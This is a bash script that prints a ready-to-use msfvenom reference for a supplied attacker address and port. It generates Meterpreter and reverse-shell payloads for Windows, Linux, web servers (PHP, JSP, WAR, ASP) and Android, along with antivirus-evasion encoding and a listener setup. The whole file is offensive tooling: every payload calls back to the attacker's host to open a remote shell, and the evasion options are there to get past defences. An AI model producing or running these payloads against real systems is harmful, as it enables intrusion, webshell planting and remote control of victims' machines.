#!/usr/bin/env bash
# ==============================================================================
# PAYLOAD GENERATOR — msfvenom payload generation reference
# Usage: bash payloads.sh <LHOST> [LPORT]
# ==============================================================================
LHOST="${1:-}"
LPORT="${2:-4444}"

[[ -z "$LHOST" ]] && { echo "Usage: bash payloads.sh <LHOST> [LPORT]"; echo "Example: bash payloads.sh 192.168.1.100 4444"; exit 1; }

echo ""
echo "=== PAYLOAD GENERATOR ==="
echo "  LHOST=$LHOST  LPORT=$LPORT"
echo ""

cat << PAYLOADS

── Windows Payloads ──────────────────────────────────────────────────────────

  # Standard EXE:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o windows_reverse_tcp.exe

  # HTTPS EXE (bypasses some AV):
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -f exe -o windows_reverse_https.exe

  # DLL:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f dll -o payload.dll

  # PowerShell (fileless):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f psh -o payload.ps1

  # Shellcode (C format):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c

── Linux Payloads ────────────────────────────────────────────────────────────

  # ELF Binary:
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o linux_reverse_tcp.elf

  # Bash one-liner:
  msfvenom -p cmd/unix/reverse_bash LHOST=${LHOST} LPORT=${LPORT} -f raw

  # Python:
  msfvenom -p cmd/unix/reverse_python LHOST=${LHOST} LPORT=${LPORT} -f raw

── Web Payloads ──────────────────────────────────────────────────────────────

  # PHP:
  msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php

  # JSP (Tomcat/Java):
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.jsp

  # WAR (Tomcat deploy):
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war

  # ASP:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f asp -o shell.asp

── Android Payloads ──────────────────────────────────────────────────────────

  # APK:
  msfvenom -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o android_payload.apk

── Encoders (AV Evasion) ─────────────────────────────────────────────────────

  # Shikata Ga Nai (recommended):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe

  # List all encoders:
  msfvenom -l encoders

── Listener Setup ────────────────────────────────────────────────────────────
  # In msfconsole, BEFORE running payload:
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST ${LHOST}
  set LPORT ${LPORT}
  exploit -j

PAYLOADS

echo ""
echo "=== DONE ==="